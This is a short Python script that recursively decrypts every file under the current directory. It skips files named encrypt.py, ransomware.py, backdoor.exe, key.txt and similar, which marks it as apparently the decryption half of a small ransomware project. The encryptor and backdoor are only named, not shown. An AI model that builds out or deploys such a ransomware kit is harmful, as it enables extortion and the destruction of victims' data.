import os
from decrypt import decrypt_file

for root, dirs, files in os.walk(".", topdown=False):
    for name in files:
        # if encrypt_or_decrypt == 'encrypt':
        if name == 'encrypt.py' or name == 'generate.py' or name == 'ransomware.py' or name == 'decrypt.py' or name == 'backdoor.exe' or name == 'key.txt'or name == 'iv.txt':
            continue
        try:
            decrypt_file(os.path.join(root, name))
            print(f'decrypting file: {os.path.join(root, name)}')
        except PermissionError:
            # print('need elevated permissions')
            continue
        except:
            continue